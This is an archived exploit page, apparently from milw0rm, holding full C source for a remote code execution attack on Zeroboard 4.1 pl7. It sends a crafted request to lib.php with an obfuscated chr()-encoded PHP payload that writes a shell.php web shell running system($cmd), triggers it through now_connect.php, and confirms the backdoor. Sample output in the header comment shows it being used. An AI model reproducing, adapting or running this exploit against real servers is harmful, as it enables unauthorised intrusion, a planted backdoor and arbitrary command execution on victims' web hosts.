<html><head><title>Zeroboard 4.1 pl7 now_connect() Remote Code Execution Exploit</title></head><pre>/*
poc by  kyoungchip,jang
email : SpeeDr00t1004@gmail.com
 
[*] the bug 
- http://www.xpressengine.com/15955761
 
Application 
- Zeroboard 4.1 pl7 
 
Reference: 
- http://www.nzeo.com 
- Zeroboard preg_replace() vulnerability Remote nobody exploit by n0gada 

 
[*] Target - My test server 
 
$ ./zbexpl http://xxx.xxx.xxx/zboard/zboard.php?id=test 
- Target : http://xxx.xxx.xxx/zboard/zboard.php?id=test 
- Target :  http://xxx.xxx.xxx/zboard/bbs/shell.php?cmd=ls 


 
[+] xxx.xxx.xxx connecting ok! 
 [+] Exploiting zeroboard start  - [+] Exploiting success!!
 [*] Create Backdoor Start - [+] Create Backdoor  success!!
 [*] Confirmming your backdoor php script - http://192.168.179.6/zeroboard/zb41pl7/bbs/data/shell.php is generated!
 [+] Exploiting success!!
 - http://192.168.179.6/zeroboard/bbs/data/shell.php?cmd=ls [+] Execute the websehll script  

*/


#include &lt;stdio.h&gt;
#include &lt;stdarg.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netdb.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;signal.h&gt;
#include &lt;time.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;sys/select.h&gt;
#include &lt;errno.h&gt;


#define BUFSIZE 4096
#define READSIZE 1500
#define EXPLOIT_CODE &quot;*/fputs(fopen(chr(46).chr(47).chr(115).chr(104).chr(101).chr(108).chr(108).chr(46).chr(112).chr(104).chr(112),chr(119).chr(43)),chr(60).chr(63).chr(32).chr(115).chr(121).chr(115).chr(116).chr(101).chr(109).chr(40).chr(36).chr(99).chr(109).chr(100).chr(41).chr(59).chr(32).chr(63).chr(62));/*&amp;HTTP_SESSION_VARS[zb_last_connect_check]=a&amp;HTTP_SERVER_VARS=1&amp;HTTP_ENV_VARS=1&quot;


void ParseZbHost(char *);
void ConnectZboard(char *, unsigned short);
void ExploitZboard(void);
void ConfirmPHPScript(void);
void CreateBackdoor(void);
void StatusProcess(void);
void Usage(char *);
void OutputErr(char *, int);

char *zb_host;
char *zb_dir;
char *zb_tid;
unsigned short zb_port;

int sockfd = -1;
int reconn=0;
char ReadBuf[READSIZE];
char WriteBuf[BUFSIZE];
char TempBuf[BUFSIZ];
char no[16];



int 
main(int argc, char *argv[])
{

        char *szArgv;
        switch( argc )
        {
        case 1 :
                Usage(argv[0]);      
                break;
        case 2 :
                zb_port = 80;
                //szArgv = &quot;http://192.168.179.6/zeroboard/zb41pl7/bbs/zboard.php?id=test&quot;;
                ParseZbHost( szArgv );
                break;

        case 3:
                zb_port = atoi(argv[2]); 
                ParseZbHost(argv[1]);
                        
                break;
        default:
        
                break;
        };

        ConnectZboard(zb_host, zb_port);
        ExploitZboard();
        CreateBackdoor();
        ConfirmPHPScript();
}

void 
ParseZbHost( char *zbhost )
{
        char *psbuf;
        char *sptr=NULL;
        char *eptr=NULL;

        psbuf = ( char* )malloc( strlen( zbhost ) + 1 );

        strcpy( psbuf, zbhost );

        if( (sptr = strstr( psbuf , &quot;http://&quot; ) ) == NULL) 
                OutputErr(&quot;http://host need\n&quot;, 0);


        zb_host = sptr + 7;

        sptr = strchr(zb_host, '/');
        sptr[0] = '\0';
        sptr++;


        if((eptr = strstr(sptr, &quot;zboard.php?id=&quot;)) == NULL) 
                        OutputErr(&quot;\&quot;zboard.php?id=\&quot;need\n&quot;, 0);

        zb_tid = eptr+14;

        eptr--;
        eptr[0] = '\0';

        zb_dir = sptr;

        char szOut[1024];
        memset( szOut , 0x00 , sizeof( szOut ) );
        sprintf( szOut , &quot; - Target : http://%s/%s/zboard.php?id=%s\n&quot;, zb_host, zb_dir, zb_tid);
}


void 
ConnectZboard( char *server , unsigned short port )
{

        struct sockaddr_in serv; 
        struct hostent *hostname;

        if( !( hostname = gethostbyname( server ) ) ) 
           printf(&quot; \nhostname = %s\n&quot;, hostname );

        if( (sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) &lt; 0) 
           printf(&quot; \n socket error &quot;);

        memset(&amp;serv, 0, sizeof(serv));
        serv.sin_family = AF_INET;
        serv.sin_port = htons(port);
        serv.sin_addr.s_addr = *((unsigned long *)hostname-&gt;h_addr_list[0]);


        if(connect(sockfd, (struct sockaddr *)&amp;serv, sizeof(struct sockaddr)) &lt; 0)
        {
            printf(&quot;\n not connect&quot;);
        }

        if(!reconn) 
        {
        }
        else if(reconn == 1) 
        {
        }
        reconn = 0;

}


void 
ExploitZboard(void)
{  

        fd_set fds;
        struct timeval tv;

        if(reconn == 1) ConnectZboard(zb_host, zb_port); 

        memset(WriteBuf, 0, sizeof(WriteBuf));


        sprintf(WriteBuf,&quot;GET http://%s/%s/lib.php?REMOTE_ADDR=&quot; , zb_host,zb_dir); 

        sprintf(WriteBuf+strlen(WriteBuf),
        &quot;%s HTTP/1.1\r\n&quot;
        &quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,application/x-shockwave-flash, application/vnd.ms-excel,application/vnd.ms-powerpoint, application/msword, */*\r\n&quot;
        &quot;Accept-Encoding: gzip, deflate\r\n&quot;
        &quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n&quot;
        &quot;Host: %s\r\n&quot;
        &quot;Connection: Keep-Alive\r\n&quot;
        &quot;\r\n&quot;,EXPLOIT_CODE, zb_host);


        fprintf(stdout, &quot; [+] Exploiting zeroboard start &quot;);
        fflush(stdout);

        if(write(sockfd, WriteBuf, strlen(WriteBuf)) &lt; 0) OutputErr(&quot;write&quot;, 1);

        tv.tv_sec = 60;
        tv.tv_usec = 0;


        FD_ZERO(&amp;fds);

        for(;;){
        memset(ReadBuf, 0, sizeof(ReadBuf));

        FD_SET(sockfd, &amp;fds);
        if(select(sockfd+1, &amp;fds, NULL, NULL, &amp;tv) &lt;= 0) OutputErr(&quot;select&quot;, 1);
        if(FD_ISSET(sockfd, &amp;fds)){
        if(read(sockfd, ReadBuf, sizeof(ReadBuf)) &lt;= 0) OutputErr(&quot;read&quot;, 1);


        if(strstr(ReadBuf, &quot;HTTP/1.1 &quot;)){
        if(strstr(ReadBuf,&quot;Connection: close\r\n&quot;)) reconn = 1;

        if(strstr(ReadBuf+9, &quot;200 OK\r\n&quot;)) { 
        fprintf(stdout,&quot; - [+] Exploiting success!!\n&quot;, zb_host, zb_dir, zb_tid);
        fflush(stdout);
        return;
        }
        else if(strstr(ReadBuf+9, &quot;404 Not Found\r\n&quot;)){
        OutputErr(&quot; - zeroboard was patched.\n&quot;
        &quot; [-] Exploit failed!\n&quot;, 0);
        }
        else if(strstr(ReadBuf+9, &quot;400 Bad Request\r\n&quot;)){
        OutputErr(&quot; - Bad Request\n&quot;
        &quot; [-] Exploit failed!\n&quot;, 0);
        }
        else {
        OutputErr(ReadBuf, 0);
        }
        }


        }
        }

        fprintf(stderr,&quot; error!\n&quot;);
}


void 
CreateBackdoor(void)
{  

        fd_set fds;
        struct timeval tv;

        if(reconn == 1) ConnectZboard(zb_host, zb_port); 

        memset(WriteBuf, 0, sizeof(WriteBuf));

        sprintf(WriteBuf,
        &quot;GET http://%s/%s/data/now_connect.php HTTP/1.1\r\n&quot;
        &quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,application/x-shockwave-flash, application/vnd.ms-excel,application/vnd.ms-powerpoint, application/msword, */*\r\n&quot;
        &quot;Accept-Encoding: gzip, deflate\r\n&quot;
        &quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n&quot;
        &quot;Host: %s\r\n&quot;
        &quot;Connection: Keep-Alive\r\n&quot;
        &quot;\r\n&quot;, zb_host,zb_dir, zb_host);

        fprintf(stdout, &quot; [*] Create Backdoor Start&quot;);
        fflush(stdout);

        if(write(sockfd, WriteBuf, strlen(WriteBuf)) &lt; 0) OutputErr(&quot;write&quot;, 1);

        tv.tv_sec = 60;
        tv.tv_usec = 0;


        FD_ZERO(&amp;fds);

        for(;;){
        memset(ReadBuf, 0, sizeof(ReadBuf));

        FD_SET(sockfd, &amp;fds);
        if(select(sockfd+1, &amp;fds, NULL, NULL, &amp;tv) &lt;= 0) OutputErr(&quot;select&quot;, 1);
        if(FD_ISSET(sockfd, &amp;fds)){
        if(read(sockfd, ReadBuf, sizeof(ReadBuf)) &lt;= 0) OutputErr(&quot;read&quot;, 1);


        if(strstr(ReadBuf, &quot;HTTP/1.1 &quot;)){
        if(strstr(ReadBuf,&quot;Connection: close\r\n&quot;)) reconn = 1;

        if(strstr(ReadBuf+9, &quot;200 OK\r\n&quot;)) { 
        fprintf(stdout,&quot; - [+] Create Backdoor  success!!\n&quot;, zb_host, zb_dir, zb_tid);
        fflush(stdout);
        return;
        }
        else if(strstr(ReadBuf+9, &quot;404 Not Found\r\n&quot;)){
        OutputErr(&quot; zeroboard was patched.\n&quot;
        &quot; [-] Exploit failed!\n&quot;, 0);
        }
        else if(strstr(ReadBuf+9, &quot;400 Bad Request\r\n&quot;)){
        OutputErr(&quot; - Bad Request\n&quot;
        &quot; [-] Exploit failed!\n&quot;, 0);
        }
        else {
        OutputErr(ReadBuf, 0);
        }
        }


        }
        }

        fprintf(stderr,&quot; error!\n&quot;);
}

void 
ConfirmPHPScript(void)
{  

        fd_set fds;
        struct timeval tv;

        if(reconn == 1) ConnectZboard(zb_host, zb_port); 

        memset(WriteBuf, 0, sizeof(WriteBuf));

        sprintf(WriteBuf,
        &quot;GET http://%s/%s/data/shell.php HTTP/1.1\r\n&quot;
        &quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,application/x-shockwave-flash, application/vnd.ms-excel,application/vnd.ms-powerpoint, application/msword, */*\r\n&quot;
        &quot;Accept-Encoding: gzip, deflate\r\n&quot;
        &quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n&quot;
        &quot;Host: %s\r\n&quot;
        &quot;Connection: Keep-Alive\r\n&quot;
        &quot;\r\n&quot;, zb_host,zb_dir, zb_host);


        fprintf(stdout, &quot; [*] Confirmming your backdoor php script&quot;);
        fflush(stdout);

        if(write(sockfd, WriteBuf, strlen(WriteBuf)) &lt; 0) OutputErr(&quot;write&quot;, 1);

        tv.tv_sec = 60;
        tv.tv_usec = 0;


        FD_ZERO(&amp;fds);

        for(;;){
        memset(ReadBuf, 0, sizeof(ReadBuf));

        FD_SET(sockfd, &amp;fds);
        if(select(sockfd+1, &amp;fds, NULL, NULL, &amp;tv) &lt;= 0) OutputErr(&quot;select&quot;, 1);
        if(FD_ISSET(sockfd, &amp;fds)){
        if(read(sockfd, ReadBuf, sizeof(ReadBuf)) &lt;= 0) OutputErr(&quot;read&quot;, 1);


        if(strstr(ReadBuf, &quot;HTTP/1.1 &quot;)){
        if(strstr(ReadBuf,&quot;Connection: close\r\n&quot;)) reconn = 1;

        if(strstr(ReadBuf+9, &quot;200 OK\r\n&quot;)) { 
        fprintf(stdout,&quot; - http://%s/%s/data/shell.php is generated!\n [+] Exploiting success!!\n&quot;, zb_host, zb_dir);
        fprintf(stdout,&quot; - http://%s/%s/data/shell.php?cmd=ls [+] Execute the websehll script  \n&quot;, zb_host, zb_dir);
        fflush(stdout);
        return;
        }
        else if(strstr(ReadBuf+9, &quot;404 Not Found\r\n&quot;)){
        OutputErr(&quot; - zeroboard was patched.\n&quot;
        &quot; [-] Exploit failed!\n&quot;, 0);
        }
        else if(strstr(ReadBuf+9, &quot;400 Bad Request\r\n&quot;)){
        OutputErr(&quot; - Bad Request\n&quot;
        &quot; [-] Exploit failed!\n&quot;, 0);
        }
        else {
        OutputErr(ReadBuf, 0);
        }
        }


        }
        }

        fprintf(stderr,&quot; error!\n&quot;);
}



void 
StatusProcess(void)
{

        putchar('.');
        fflush(stdout);
}


void 
OutputErr(char *msg, int type)
{

        if(!type)
        {
                fprintf(stderr,&quot;%s&quot;, msg);
                fflush(stderr);
        }
        else if(type==1)
        {
                if(!strcmp(msg, zb_host)) 
                {
                        herror(msg);
                }
                else 
                {
                        perror(msg);
                }
        }

        exit(1);
}

void 
Usage(char *arg)
{ 
        fprintf(stderr,&quot;[*] Zeroboard now_connect() vulnerability Remote code execution  exploit by SpeeDr00t\n&quot;); 
        fprintf(stderr,&quot;--------------------------------------------------------------------------\n&quot;);
        fprintf(stderr,&quot;Usage: %s &lt;SERVER&gt; [PORT - default : 80] \n&quot;, arg);
        fprintf(stderr,&quot;--------------------------------------------------------------------------\n&quot;);

        exit(1);
}

// milw0rm.com [2009-09-04]</pre></html>